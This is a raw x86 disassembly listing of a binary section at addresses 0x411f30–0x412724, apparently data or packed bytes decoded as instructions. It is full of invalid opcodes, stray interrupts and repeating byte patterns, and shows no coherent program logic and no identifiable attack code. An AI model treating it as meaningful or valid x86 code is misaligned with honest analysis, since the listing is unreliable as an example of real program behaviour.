  411f30:	cmp    DWORD PTR [edi+0x64452c12],0x30764314
  411f3a:	inc    ecx
  411f3b:	push   esp
  411f3c:	out    0x34,eax
  411f3e:	push   ecx
  411f3f:	xchg   ecx,eax
  411f40:	xchg   edi,eax
  411f41:	shl    DWORD PTR [ebx],1
  411f43:	int    0x5e
  411f45:	test   BYTE PTR [ecx+0x4062b35e],dl
  411f4b:	and    eax,0x5406600
  411f50:	inc    ebx
  411f51:	inc    ecx
  411f52:	inc    eax
  411f53:	inc    eax
  411f54:	inc    ebx
  411f55:	add    BYTE PTR [eax],al
  411f57:	add    BYTE PTR [edx-0x34],ah
  411f5a:	inc    eax
  411f5b:	add    eax,0x40004041
  411f60:	inc    ecx
  411f61:	int3   
  411f62:	add    BYTE PTR [ebx-0x7c],al
  411f65:	add    eax,0x5406240
  411f6a:	bound  ecx,QWORD PTR [eax+eiz*8+0x72]
  411f6e:	test   eax,0x39394405
  411f73:	xor    esp,DWORD PTR [edx-0x6]
  411f76:	add    DWORD PTR [edi+0x4895712c],0x4040441e
  411f80:	adc    dl,BYTE PTR [edi+ebx*1]
  411f83:	inc    eax
  411f84:	bound  ebx,QWORD PTR [eax+0x41]
  411f87:	add    eax,0x40404340
  411f8c:	inc    ebx
  411f8d:	inc    eax
  411f8e:	test   BYTE PTR [eax],al
  411f90:	add    eax,0x40624041
  411f95:	inc    eax
  411f96:	add    BYTE PTR [edx+0x5],ah
  411f99:	inc    ebx
  411f9a:	add    BYTE PTR [eax+0x78],al
  411f9d:	inc    ecx
  411f9e:	add    BYTE PTR [eax+0x41],bl
  411fa1:	bound  edx,QWORD PTR [ebx]
  411fa3:	les    ebp,FWORD PTR [ecx+eax*1]
  411fa6:	inc    ecx
  411fa7:	push   ecx
  411fa8:	xor    eax,0x52cb4632
  411fad:	mov    al,ds:0x113e910b
  411fb2:	cmc    
  411fb3:	adc    ch,al
  411fb5:	inc    esp
  411fb6:	xor    BYTE PTR [esi+eax*2+0x40],al
  411fba:	inc    ecx
  411fbb:	je     0x412019
  411fbd:	inc    esp
  411fbe:	and    DWORD PTR [ecx+esi*1],ebp
  411fc1:	call   DWORD PTR [ecx]
  411fc3:	es loop 0x412025
  411fc6:	in     al,0x10
  411fc8:	pop    ebp
  411fc9:	mov    esi,0x4044e176
  411fce:	test   BYTE PTR [eax],al
  411fd0:	int3   
  411fd1:	bound  eax,QWORD PTR ds:0xcc840f41
  411fd7:	inc    ebx
  411fd8:	add    BYTE PTR [eax+0x0],al
  411fdb:	inc    eax
  411fdc:	inc    eax
  411fdd:	inc    eax
  411fde:	int3   
  411fdf:	add    BYTE PTR ds:0x62404341,al
  411fe5:	pop    eax
  411fe6:	add    BYTE PTR [ebx+0x40],al
  411fe9:	bound  ecx,QWORD PTR [edi]
  411feb:	inc    eax
  411fec:	mov    esp,0xbf34d5f8
  411ff1:	dec    DWORD PTR [ecx]
  411ff3:	sub    al,0x74
  411ff5:	imul   esp,DWORD PTR [eax+0x4],0x20
  411ff9:	jns    0x412003
  411ffb:	push   eax
  411ffc:	cmp    eax,0x4041fec5
  412001:	fldenv [edx]
  412003:	je     0x41204e
  412005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412006:	inc    esp
  412007:	adc    BYTE PTR [eax+0x54],al
  41200a:	lods   al,BYTE PTR ds:[esi]
  41200b:	mov    DWORD PTR [edx+0x45],ebx
  41200e:	sub    al,0x6e
  412010:	dec    edi
  412011:	adc    eax,0x256844c4
  412016:	push   cs
  412017:	popa   
  412018:	nop
  412019:	mov    edi,0x6b432c5d
  41201e:	int    0xf3
  412020:	mov    ah,0x45
  412022:	add    BYTE PTR [eax],al
  412024:	inc    eax
  412025:	inc    eax
  412026:	cmovno eax,DWORD PTR ds:0x40056243
  41202d:	int3   
  41202e:	add    ah,cl
  412030:	inc    eax
  412031:	inc    eax
  412032:	bound  eax,QWORD PTR [ecx+0x0]
  412035:	add    BYTE PTR [edi],cl
  412037:	inc    ebx
  412038:	inc    eax
  412039:	inc    eax
  41203a:	add    BYTE PTR [ecx+0x43],al
  41203d:	add    eax,0x40256240
  412042:	bound  eax,QWORD PTR [eax]
  412044:	test   al,0x4e
  412046:	adc    al,0xd0
  412048:	pusha  
  412049:	pop    esp
  41204a:	push   edx
  41204b:	xchg   ecx,eax
  41204c:	adc    bl,BYTE PTR [edx+0x67]
  41204f:	inc    edi
  412050:	repnz push ebx
  412052:	mov    ebx,0x59914852
  412057:	cmp    DWORD PTR [ebp+ecx*2+0x4f],eax
  41205b:	adc    DWORD PTR [ecx+0x44],eax
  41205e:	shl    ah,1
  412060:	sub    al,0xd5
  412062:	inc    eax
  412063:	js     0x412082
  412065:	sub    al,0xcb
  412067:	sub    ecx,DWORD PTR [edi+edx*4]
  41206a:	inc    eax
  41206b:	aad    0x74
  41206d:	dec    esp
  41206e:	dec    edi
  41206f:	loope  0x412036
  412071:	sub    eax,0x40cc0005
  412076:	inc    ecx
  412077:	inc    eax
  412078:	inc    ebx
  412079:	bound  esp,QWORD PTR ds:0x41400043
  41207f:	add    BYTE PTR [eax],al
  412081:	add    eax,0x43624062
  412086:	inc    ecx
  412087:	inc    eax
  412088:	inc    eax
  412089:	inc    eax
  41208a:	add    eax,0x40624340
  41208f:	add    eax,0x40664140
  412094:	jle    0x412110
  412096:	bound  eax,QWORD PTR [eax-0x6a]
  412099:	cwde   
  41209a:	outs   dx,BYTE PTR ds:[esi]
  41209b:	adc    esp,DWORD PTR [ecx]
  41209d:	(bad)  
  41209e:	test   ch,cl
  4120a0:	fisub  DWORD PTR [ecx]
  4120a2:	loop   0x4120e7
  4120a4:	aad    0x21
  4120a6:	enter  0x5c69,0xc5
  4120aa:	inc    esp
  4120ab:	nop
  4120ac:	inc    ecx
  4120ad:	inc    ebx
  4120ae:	sub    BYTE PTR [edx-0x18],cl
  4120b1:	scas   eax,DWORD PTR es:[edi]
  4120b2:	sub    al,0x21
  4120b4:	pop    eax
  4120b5:	rcl    DWORD PTR [esi],1
  4120b7:	aad    0x60
  4120b9:	inc    ebx
  4120ba:	add    BYTE PTR ds:0x41107840,al
  4120c0:	bound  eax,QWORD PTR [eax+0x40]
  4120c3:	sldt   WORD PTR [eax-0x34]
  4120c7:	js     0x41212b
  4120c9:	add    eax,0x40664143
  4120ce:	inc    ebx
  4120cf:	add    BYTE PTR [ecx+0x5],al
  4120d2:	js     0x412114
  4120d4:	bound  eax,QWORD PTR [eax+0x0]
  4120d7:	inc    eax
  4120d8:	ror    BYTE PTR [edx],1
  4120da:	sbb    BYTE PTR [ecx],bh
  4120dc:	inc    eax
  4120dd:	xchg   ebx,eax
  4120de:	inc    ecx
  4120df:	shl    BYTE PTR [edx+0x51],0x93
  4120e3:	adc    esp,esi
  4120e5:	(bad)  
  4120e6:	out    dx,al
  4120e7:	leave  
  4120e8:	dec    ebp
  4120e9:	xchg   ecx,eax
  4120ea:	pop    ebx
  4120eb:	jno    0x412091
  4120ed:	cmp    al,0x56
  4120ef:	mov    esp,0x66374403
  4120f4:	mov    dh,0x94
  4120f6:	and    BYTE PTR ds:0xb3632c79,dh
  4120fc:	or     BYTE PTR [eax+0x48],al
  4120ff:	sbb    ch,BYTE PTR [edi+0x8]
  412102:	fld    DWORD PTR [ebp+esi*1+0x7f]
  412106:	int    0x63
  412108:	and    ch,cl
  41210a:	and    eax,0x41711915
  41210f:	inc    ebx
  412110:	inc    eax
  412111:	inc    eax
  412112:	add    eax,0x434162
  412117:	inc    eax
  412118:	add    BYTE PTR [edx+0x5],ah
  41211b:	inc    eax
  41211c:	adc    BYTE PTR [edx+0x40],ah
  41211f:	inc    ebx
  412120:	inc    ecx
  412121:	add    eax,0x4340
  412126:	add    eax,0x404162
  41212b:	add    BYTE PTR [eax+0x43],al
  41212e:	inc    eax
  41212f:	add    eax,0x42756033
  412134:	aad    0x77
  412136:	mov    bl,0x62
  412138:	out    0xd4,al
  41213a:	fstp   st(6)
  41213c:	inc    ecx
  41213d:	dec    edi
  41213e:	inc    ebp
  41213f:	add    eax,0x396b4056
  412144:	mov    cl,0x93
  412146:	adc    al,BYTE PTR [edi+0x48844020]
  41214c:	inc    eax
  41214d:	add    BYTE PTR [eax],al
  41214f:	inc    ecx
  412150:	inc    ebx
  412151:	add    eax,0x41784062
  412156:	inc    eax
  412157:	inc    eax
  412158:	add    BYTE PTR [edi],cl
  41215a:	bound  eax,QWORD PTR [ebx+0x0]
  41215d:	add    eax,0x25006240
  412162:	inc    eax
  412163:	add    eax,0x40254143
  412168:	add    eax,0x9f620000
  41216d:	cmp    dh,BYTE PTR [esi]
  41216f:	inc    edi
  412170:	inc    esi
  412171:	push   ebx
  412172:	xor    DWORD PTR [bx+di+0x11],edx
  412176:	dec    ecx
  412177:	stos   DWORD PTR es:[edi],eax
  412178:	inc    edx
  412179:	ja     0x412120
  41217b:	push   es
  41217c:	sbb    DWORD PTR [ecx+0x19],eax
  41217f:	inc    ecx
  412180:	cmp    DWORD PTR [edx+ecx*1+0x437660c5],0xf942691d
  41218b:	push   es
  41218c:	xchg   esp,eax
  41218d:	inc    ecx
  41218e:	adc    ah,BYTE PTR [esp+eax*2+0x27fa62bb]
  412195:	jg     0x4121ce
  412197:	bound  ebp,QWORD PTR [edi+0x38]
  41219a:	xchg   ecx,eax
  41219b:	inc    esp
  41219c:	dec    ebp
  41219d:	jle    0x4121e4
  41219f:	inc    edx
  4121a0:	inc    ebx
  4121a1:	add    BYTE PTR [eax],al
  4121a3:	add    BYTE PTR [ecx+0x40],al
  4121a6:	bound  esp,QWORD PTR [esi+0x0]
  4121a9:	inc    eax
  4121aa:	add    eax,0x5400000
  4121af:	inc    ecx
  4121b0:	inc    eax
  4121b1:	inc    eax
  4121b2:	bound  esp,QWORD PTR ds:0x25050043
  4121b8:	inc    ecx
  4121b9:	inc    ebx
  4121ba:	inc    eax
  4121bb:	test   BYTE PTR [eax+0x0],al
  4121be:	bound  ebx,QWORD PTR [eax+0x62]
  4121c1:	inc    ecx
  4121c2:	inc    eax
  4121c3:	cdq    
  4121c4:	push   0x9f5320bf
  4121c9:	push   ecx
  4121ca:	fdiv   DWORD PTR [esi]
  4121cc:	call   0x51922639
  4121d1:	lods   eax,DWORD PTR ds:[esi]
  4121d2:	shl    BYTE PTR [eax+eiz*8],0x8
  4121d6:	aad    0xd3
  4121d8:	fisttp WORD PTR [ebp-0x35]
  4121db:	mov    BYTE PTR [edx+0x41],ah
  4121de:	pop    esp
  4121df:	adc    BYTE PTR [edx+0x40],ah
  4121e2:	inc    ecx
  4121e3:	and    eax,0x40000500
  4121e8:	inc    ebx
  4121e9:	add    eax,0x40624041
  4121ee:	inc    ebx
  4121ef:	add    eax,0x43402541
  4121f4:	bound  eax,QWORD PTR [eax+0x43]
  4121f7:	int3   
  4121f8:	inc    eax
  4121f9:	bound  eax,QWORD PTR [eax]
  4121fb:	inc    ecx
  4121fc:	inc    eax
  4121fd:	inc    eax
  4121fe:	add    eax,0x11516f05
  412203:	mov    edi,0xce4246c5
  412208:	jae    0x4121e9
  41220a:	inc    edx
  41220b:	mov    esi,0x233c344f
  412210:	pop    eax
  412211:	add    eax,0xae41bf71
  412216:	mov    ds:0x45beb344,eax
  41221b:	xlat   BYTE PTR ds:[ebx]
  41221c:	bound  eax,QWORD PTR [eax+0x25]
  41221f:	add    BYTE PTR [esi+0x40],ah
  412222:	add    eax,0x40404143
  412227:	inc    ebx
  412228:	add    BYTE PTR [eax],al
  41222a:	add    BYTE PTR [edx-0x34],ah
  41222d:	inc    eax
  41222e:	add    eax,0x40004041
  412233:	inc    ecx
  412234:	int3   
  412235:	add    BYTE PTR [ebx-0x7c],al
  412238:	add    eax,0x5406240
  41223d:	bound  ecx,QWORD PTR [edx+ebx*8-0x58]
  412241:	and    DWORD PTR [edx+0x16],ebx
  412244:	xchg   ecx,eax
  412245:	test   al,0x42
  412247:	arpl   WORD PTR [eax],dx
  412249:	xor    bh,BYTE PTR [edx+0x41466ff0]
  41224f:	xchg   edx,eax
  412250:	pop    eax
  412251:	sub    eax,0xc8910f9f
  412256:	les    edi,FWORD PTR [eax+0x41]
  412259:	cmp    DWORD PTR [ecx+0x79045351],edi
  41225f:	jge    0x412279
  412261:	inc    eax
  412262:	bound  ebx,QWORD PTR [eax+0x41]
  412265:	add    eax,0x40404340
  41226a:	inc    ebx
  41226b:	inc    eax
  41226c:	test   BYTE PTR [eax],al
  41226e:	add    eax,0x40624041
  412273:	inc    eax
  412274:	add    BYTE PTR [edx+0x5],ah
  412277:	inc    ebx
  412278:	add    BYTE PTR [eax+0x78],al
  41227b:	inc    ecx
  41227c:	add    BYTE PTR [eax+0x41],bl
  41227f:	bound  ebx,QWORD PTR [eax+eax*2-0x70]
  412283:	adc    eax,0x3062c562
  412288:	sub    al,0x29
  41228a:	adc    BYTE PTR gs:[ebx+0x4f],dl
  41228e:	aam    0x62
  412290:	xor    BYTE PTR [eax+0x6a],ah
  412293:	xlat   BYTE PTR ds:[ebx]
  412294:	xor    al,0x41
  412296:	inc    ebx
  412297:	lds    edi,FWORD PTR cs:[ebx+0x38]
  41229b:	push   edx
  41229c:	xchg   DWORD PTR [eax-0x3f],ecx
  41229f:	cmp    al,0x41
  4122a1:	rol    DWORD PTR [eax-0x7c],0x0
  4122a5:	int3   
  4122a6:	bound  eax,QWORD PTR ds:0xcc840f41
  4122ac:	inc    ebx
  4122ad:	add    BYTE PTR [eax+0x0],al
  4122b0:	inc    eax
  4122b1:	inc    eax
  4122b2:	inc    eax
  4122b3:	int3   
  4122b4:	add    BYTE PTR ds:0x62404341,al
  4122ba:	pop    eax
  4122bb:	add    BYTE PTR [ebx+0x40],al
  4122be:	bound  ecx,QWORD PTR [edi]
  4122c0:	inc    eax
  4122c1:	push   0x17
  4122c3:	call   0x3f95:0xeea85b42
  4122ca:	inc    ebp
  4122cb:	dec    esp
  4122cc:	rol    BYTE PTR [ebx+0x40],0x44
  4122d0:	dec    edx
  4122d1:	push   edx
  4122d2:	xchg   ebx,eax
  4122d3:	test   al,bl
  4122d5:	shr    DWORD PTR [edx],0x2c
  4122d8:	aad    0x3f
  4122da:	mov    edi,0x12f803c3
  4122df:	cs pop ebx
  4122e1:	push   edx
  4122e2:	jb     0x4122a3
  4122e4:	pop    eax
  4122e5:	xor    BYTE PTR [ebp+edx*8-0x41edc00d],ah
  4122ec:	cmp    DWORD PTR [edx+0x44],esp
  4122ef:	inc    edi
  4122f0:	dec    esi
  4122f1:	out    dx,eax
  4122f2:	mov    dh,0xb6
  4122f4:	lods   al,BYTE PTR ds:[esi]
  4122f5:	fs add al,0xee
  4122f8:	je     0x41234c
  4122fa:	add    BYTE PTR [eax],al
  4122fc:	inc    eax
  4122fd:	inc    eax
  4122fe:	cmovno eax,DWORD PTR ds:0x40056243
  412305:	int3   
  412306:	add    ah,cl
  412308:	inc    eax
  412309:	inc    eax
  41230a:	bound  eax,QWORD PTR [ecx+0x0]
  41230d:	add    BYTE PTR [edi],cl
  41230f:	inc    ebx
  412310:	inc    eax
  412311:	inc    eax
  412312:	add    BYTE PTR [ecx+0x43],al
  412315:	add    eax,0x40256240
  41231a:	bound  eax,QWORD PTR [eax]
  41231c:	dec    ebx
  41231d:	mov    esp,0x445c9145
  412322:	pop    edi
  412323:	aas    
  412324:	adc    ebp,DWORD PTR [eax+0x2c62630c]
  41232a:	adc    BYTE PTR [edx+0x33],dl
  41232d:	adc    al,BYTE PTR [ecx+0x9]
  412330:	dec    eax
  412331:	sub    al,0x6b
  412333:	aas    
  412334:	icebp  
  412335:	nop
  412336:	jae    0x4122d0
  412338:	retf   
  412339:	int    0x7b
  41233b:	pusha  
  41233c:	inc    esp
  41233d:	inc    edi
  41233e:	add    eax,0x4140cc00
  412343:	inc    eax
  412344:	inc    ebx
  412345:	bound  esp,QWORD PTR ds:0x41400043
  41234b:	add    BYTE PTR [eax],al
  41234d:	add    eax,0x43624062
  412352:	inc    ecx
  412353:	inc    eax
  412354:	inc    eax
  412355:	inc    eax
  412356:	add    eax,0x40624340
  41235b:	add    eax,0x40664140
  412360:	bound  edi,QWORD PTR [bx+0x505c]
  412365:	push   edx
  412366:	adc    DWORD PTR [esi+esi*4],edi
  412369:	sar    BYTE PTR [edi+0x6c75d3ee],1
  41236f:	js     0x4123ba
  412371:	inc    ebx
  412372:	add    DWORD PTR [edx+eiz*1+0x41],0x11
  412377:	(bad)
  41237c:	xchg   ebx,eax
  41237d:	cmp    DWORD PTR [ebp+0x5f],edx
  412380:	mov    ah,0x74
  412382:	test   al,0x2a
  412384:	inc    ecx
  412385:	inc    eax
  412386:	adc    eax,ebp
  412388:	popa   
  412389:	jl     0x4123cf
  41238b:	lds    edx,FWORD PTR [ecx-0xe]
  41238e:	inc    ebx
  41238f:	loope  0x41237a
  412391:	in     eax,dx
  412392:	(bad)  
  412393:	pop    esp
  412394:	dec    eax
  412395:	push   0x63669955
  41239a:	sub    al,0xee
  41239c:	aaa    
  41239d:	je     0x4123e2
  41239f:	add    BYTE PTR ds:0x41107840,al
  4123a5:	bound  eax,QWORD PTR [eax+0x40]
  4123a8:	sldt   WORD PTR [eax-0x34]
  4123ac:	js     0x412410
  4123ae:	add    eax,0x40664143
  4123b3:	inc    ebx
  4123b4:	add    BYTE PTR [ecx+0x5],al
  4123b7:	js     0x4123f9
  4123b9:	bound  eax,QWORD PTR [eax+0x0]
  4123bc:	inc    eax
  4123bd:	jmp    FWORD PTR [eax]
  4123bf:	mov    dl,0x77
  4123c1:	cmp    BYTE PTR [edi+esi*2-0x6b],al
  4123c5:	inc    esp
  4123c6:	jbe    0x4123dd
  4123c8:	mov    edx,0x9d732c14
  4123cd:	xor    esi,DWORD PTR [edi+esi*2]
  4123d0:	lds    esp,FWORD PTR [esi+0x28]
  4123d3:	push   esi
  4123d4:	je     0x412428
  4123d6:	inc    eax
  4123d7:	out    0x64,al
  4123d9:	inc    ecx
  4123da:	aad    0xf2
  4123dc:	lahf   
  4123dd:	xchg   ecx,eax
  4123de:	inc    ebp
  4123df:	cli    
  4123e0:	ins    DWORD PTR es:[edi],dx
  4123e1:	jl     0x4123fb
  4123e3:	aas    
  4123e4:	es dec edi
  4123e6:	push   es
  4123e7:	mov    al,0x60
  4123e9:	addr16 loop 0x412395
  4123ec:	adc    al,BYTE PTR ss:[eax]
  4123ef:	or     eax,0x4341bf62
  4123f4:	inc    eax
  4123f5:	inc    eax
  4123f6:	add    eax,0x434162
  4123fb:	inc    eax
  4123fc:	add    BYTE PTR [edx+0x5],ah
  4123ff:	inc    eax
  412400:	adc    BYTE PTR [edx+0x40],ah
  412403:	inc    ebx
  412404:	inc    ecx
  412405:	add    eax,0x4340
  41240a:	add    eax,0x404162
  41240f:	add    BYTE PTR [eax+0x43],al
  412412:	inc    eax
  412413:	add    eax,0x2e2d5844
  412418:	bound  ebp,QWORD PTR [edx]
  41241a:	mov    ebp,DWORD PTR [edx]
  41241c:	sub    al,0x51
  41241e:	pop    ecx
  41241f:	dec    edi
  412420:	fld    QWORD PTR [ebx+0x4626f99c]
  412426:	mov    cl,0x33
  412428:	les    ebp,FWORD PTR [esi+0x335f6252]
  41242e:	jl     0x412478
  412430:	scas   al,BYTE PTR es:[edi]
  412431:	add    eax,0x498dd076
  412436:	ja     0x41246a
  412438:	jnp    0x41249e
  41243a:	rol    BYTE PTR [ebx+0x44],0x71
  41243e:	add    esp,DWORD PTR ds:0x3d628225
  412444:	sub    al,0x59
  412446:	xor    ecx,DWORD PTR [edx]
  412448:	inc    eax
  412449:	add    BYTE PTR [eax],al
  41244b:	inc    ecx
  41244c:	inc    ebx
  41244d:	add    eax,0x41784062
  412452:	inc    eax
  412453:	inc    eax
  412454:	add    BYTE PTR [edi],cl
  412456:	bound  eax,QWORD PTR [ebx+0x0]
  412459:	add    eax,0x25006240
  41245e:	inc    eax
  41245f:	add    eax,0x40254143
  412464:	add    eax,0x66620000
  412469:	lods   al,BYTE PTR ds:[esi]
  41246a:	rcr    DWORD PTR [esp-0x28],0xe6
  41246f:	xchg   ebx,eax
  412470:	lods   al,BYTE PTR ds:[esi]
  412471:	jg     0x412481
  412473:	test   al,0xc5
  412475:	xor    eax,0xb54dad73
  41247a:	test   al,0x11
  41247c:	push   ebx
  41247d:	jae    0x4124f0
  41247f:	inc    esp
  412480:	mov    eax,ds:0x43b82c02
  412485:	add    BYTE PTR [eax],al
  412487:	add    BYTE PTR [ecx+0x40],al
  41248a:	bound  esp,QWORD PTR [esi+0x0]
  41248d:	inc    eax
  41248e:	add    eax,0x5400000
  412493:	inc    ecx
  412494:	inc    eax
  412495:	inc    eax
  412496:	bound  esp,QWORD PTR ds:0x25050043
  41249c:	inc    ecx
  41249d:	inc    ebx
  41249e:	inc    eax
  41249f:	test   BYTE PTR [eax+0x0],al
  4124a2:	bound  ebx,QWORD PTR [eax+0x62]
  4124a5:	inc    ecx
  4124a6:	inc    eax
  4124a7:	out    dx,al
  4124a8:	xchg   ebp,eax
  4124a9:	xchg   edx,eax
  4124aa:	shr    DWORD PTR [edx+0x44414735],cl
  4124b0:	pop    ds
  4124b1:	lahf   
  4124b2:	inc    eax
  4124b3:	or     eax,0x2c28c950
  4124b8:	mov    bl,0x68
  4124ba:	lock pushf 
  4124bc:	dec    esp
  4124bd:	and    eax,0x4e3b22f4
  4124c2:	pusha  
  4124c3:	jmp    0x9d38:0x2d64b03d
  4124ca:	pop    es
  4124cb:	fs ret 
  4124cd:	add    eax,0x4c539912
  4124d2:	jae    0x4124cd
  4124d4:	or     BYTE PTR [edi+0x725c51e0],al
  4124da:	addr16 test al,0x44
  4124dd:	pop    eax
  4124de:	adc    eax,0x41406210
  4124e3:	and    eax,0x40000500
  4124e8:	inc    ebx
  4124e9:	add    eax,0x40624041
  4124ee:	inc    ebx
  4124ef:	add    eax,0x43402541
  4124f4:	bound  eax,QWORD PTR [eax+0x43]
  4124f7:	int3   
  4124f8:	inc    eax
  4124f9:	bound  eax,QWORD PTR [eax]
  4124fb:	inc    ecx
  4124fc:	inc    eax
  4124fd:	inc    eax
  4124fe:	add    eax,0x27b33c05
  412503:	pop    ebx
  412504:	jp     0x412579
  412506:	dec    eax
  412507:	int    0x20
  412509:	dec    esi
  41250a:	gs gs into 
  41250d:	js     0x412588
  41250f:	inc    ecx
  412510:	int    0x71
  412512:	icebp  
  412513:	cmc    
  412514:	data16 (bad) 
  412516:	fdivr  QWORD PTR [ecx+0x4b]
  412519:	inc    edx
  41251a:	push   0x1b4ca64a
  41251f:	sub    dl,dh
  412521:	xchg   ecx,eax
  412522:	xor    BYTE PTR [ecx-0x7f1bd79f],dh
  412528:	dec    ebp
  412529:	inc    ebp
  41252a:	and    esp,DWORD PTR [edx+0x40]
  41252d:	and    eax,0x5406600
  412532:	inc    ebx
  412533:	inc    ecx
  412534:	inc    eax
  412535:	inc    eax
  412536:	inc    ebx
  412537:	add    BYTE PTR [eax],al
  412539:	add    BYTE PTR [edx-0x34],ah
  41253c:	inc    eax
  41253d:	add    eax,0x40004041
  412542:	inc    ecx
  412543:	int3   
  412544:	add    BYTE PTR [ebx-0x7c],al
  412547:	add    eax,0x5406240
  41254c:	bound  edi,QWORD PTR [ebx-0x1f]
  41254f:	inc    ebp
  412550:	fs or  eax,0x5b4ed138
  412556:	arpl   sp,cx
  412558:	inc    ebp
  412559:	leave  
  41255a:	push   ds
  41255b:	dec    edx
  41255c:	xchg   ebx,eax
  41255d:	lahf   
  41255e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41255f:	inc    edi
  412560:	pushf  
  412561:	dec    esp
  412562:	inc    eax
  412563:	bound  ebx,QWORD PTR [eax+0x41]
  412566:	add    eax,0x40404340
  41256b:	inc    ebx
  41256c:	inc    eax
  41256d:	test   BYTE PTR [eax],al
  41256f:	add    eax,0x40624041
  412574:	inc    eax
  412575:	add    BYTE PTR [edx+0x5],ah
  412578:	inc    ebx
  412579:	add    BYTE PTR [eax+0x78],al
  41257c:	inc    ecx
  41257d:	add    BYTE PTR [eax+0x41],bl
  412580:	bound  eax,QWORD PTR [edx+0x31]
  412583:	sub    eax,0x52b64604
  412588:	or     eax,0x534e567d
  41258d:	mov    ch,0x67
  41258f:	inc    ebp
  412590:	retf   
  412591:	imul   esi,DWORD PTR [ebx],0xc4a2469f
  412597:	cmp    eax,0x4e5b1c43
  41259c:	xchg   edx,eax
  41259d:	inc    esi
  41259e:	or     eax,0xd3d54f5c
  4125a3:	lahf   
  4125a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125a5:	mov    ch,0x4f
  4125a7:	sub    BYTE PTR [eax],ah
  4125a9:	dec    edx
  4125aa:	mov    edi,0x3ea06f73
  4125af:	mov    esp,0x777bfa42
  4125b4:	rcl    DWORD PTR ds:0xfa2415c2,cl
  4125ba:	jmp    0x630a8b0e
  4125bf:	jae    0x412601
  4125c1:	test   BYTE PTR [eax],al
  4125c3:	int3   
  4125c4:	bound  eax,QWORD PTR ds:0xcc840f41
  4125ca:	inc    ebx
  4125cb:	add    BYTE PTR [eax+0x0],al
  4125ce:	inc    eax
  4125cf:	inc    eax
  4125d0:	inc    eax
  4125d1:	int3   
  4125d2:	add    BYTE PTR ds:0x62404341,al
  4125d8:	pop    eax
  4125d9:	add    BYTE PTR [ebx+0x40],al
  4125dc:	bound  ecx,QWORD PTR [edi]
  4125de:	inc    eax
  4125df:	jl     0x41259b
  4125e1:	pusha  
  4125e2:	mov    edi,0xafcd2671
  4125e7:	test   al,0x68
  4125e9:	addr16 push edi
  4125eb:	cmovno esp,DWORD PTR [esi-0x7a]
  4125ef:	adc    bl,dl
  4125f1:	xor    BYTE PTR [ebx+0x42c095d2],0xe0
  4125f8:	mov    eax,0x48265867
  4125fd:	adc    eax,0x935f415e
  412602:	xor    DWORD PTR [esi+0x62],eax
  412605:	dec    edi
  412606:	and    al,0x2a
  412608:	mov    eax,ds:0xfa3140ab
  41260d:	out    0x4f,al
  41260f:	and    BYTE PTR [esi+0x9d504c],dh
  412615:	add    BYTE PTR [eax+0x40],al
  412618:	cmovno eax,DWORD PTR ds:0x40056243
  41261f:	int3   
  412620:	add    ah,cl
  412622:	inc    eax
  412623:	inc    eax
  412624:	bound  eax,QWORD PTR [ecx+0x0]
  412627:	add    BYTE PTR [edi],cl
  412629:	inc    ebx
  41262a:	inc    eax
  41262b:	inc    eax
  41262c:	add    BYTE PTR [ecx+0x43],al
  41262f:	add    eax,0x40256240
  412634:	bound  eax,QWORD PTR [eax]
  412636:	sahf   
  412637:	inc    esp
  412638:	mov    ds:0x79636868,al
  41263d:	inc    ecx
  41263e:	or     eax,0xb919812c
  412643:	pop    ecx
  412644:	mov    esi,0xbc3ec9b1
  412649:	shl    DWORD PTR [ecx+eiz*1-0x32d9f2a9],0x15
  412651:	inc    ebx
  412652:	push   0x42533172
  412657:	sbb    al,BYTE PTR [edx+0x34]
  41265a:	mov    ecx,0x734457a1
  41265f:	loop   0x4126a6
  412661:	push   cs
  412662:	mov    dl,0xac
  412664:	mov    ebx,0x3044ecf1
  412669:	mov    al,0x5
  41266b:	add    ah,cl
  41266d:	inc    eax
  41266e:	inc    ecx
  41266f:	inc    eax
  412670:	inc    ebx
  412671:	bound  esp,QWORD PTR ds:0x41400043
  412677:	add    BYTE PTR [eax],al
  412679:	add    eax,0x43624062
  41267e:	inc    ecx
  41267f:	inc    eax
  412680:	inc    eax
  412681:	inc    eax
  412682:	add    eax,0x40624340
  412687:	add    eax,0x40664140
  41268c:	push   0x63422ae3
  412691:	sub    al,0xbc
  412693:	cmc    
  412694:	mov    ecx,0x9cb131bf
  412699:	cmp    al,0xd
  41269b:	bound  esi,QWORD PTR [eax+0x5434464]
  4126a1:	lds    esi,FWORD PTR [ebx+0x78]
  4126a4:	adc    eax,0x7cd1b023
  4126a9:	pop    esp
  4126aa:	fst    st(4)
  4126ac:	dec    ebp
  4126ad:	iret   
  4126ae:	sub    al,0x42
  4126b0:	add    dh,dh
  4126b2:	ins    BYTE PTR es:[edi],dx
  4126b3:	and    al,0xe2
  4126b5:	and    ebp,DWORD PTR [ecx]
  4126b7:	cmc    
  4126b8:	fs inc ebx
  4126ba:	add    BYTE PTR ds:0x41107840,al
  4126c0:	bound  eax,QWORD PTR [eax+0x40]
  4126c3:	sldt   WORD PTR [eax-0x34]
  4126c7:	js     0x41272b
  4126c9:	add    eax,0x40664143
  4126ce:	inc    ebx
  4126cf:	add    BYTE PTR [ecx+0x5],al
  4126d2:	js     0x412714
  4126d4:	bound  eax,QWORD PTR [eax+0x0]
  4126d7:	inc    eax
  4126d8:	inc    esp
  4126d9:	push   ss
  4126da:	xor    eax,0x43f2defa
  4126df:	clc    
  4126e0:	sub    al,0xc0
  4126e2:	sub    BYTE PTR [esi-0x650e8511],ch
  4126e8:	cmp    ah,BYTE PTR [ecx+0x3640d06]
  4126ee:	ja     0x412705
  4126f0:	aad    0xc1
  4126f2:	gs dec ebp
  4126f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126f5:	xchg   ecx,eax
  4126f6:	cmc    
  4126f7:	pusha  
  4126f8:	adc    al,0x47
  4126fa:	xchg   edx,eax
  4126fb:	out    dx,eax
  4126fc:	push   esi
  4126fd:	mov    ch,0xbf
  4126ff:	mov    ebx,0xf978a1e2
  412704:	inc    ecx
  412705:	inc    ebx
  412706:	inc    eax
  412707:	inc    eax
  412708:	add    eax,0x434162
  41270d:	inc    eax
  41270e:	add    BYTE PTR [edx+0x5],ah
  412711:	inc    eax
  412712:	adc    BYTE PTR [edx+0x40],ah
  412715:	inc    ebx
  412716:	inc    ecx
  412717:	add    eax,0x4340
  41271c:	add    eax,0x404162
  412721:	add    BYTE PTR [eax+0x43],al
  412724:	inc    eax
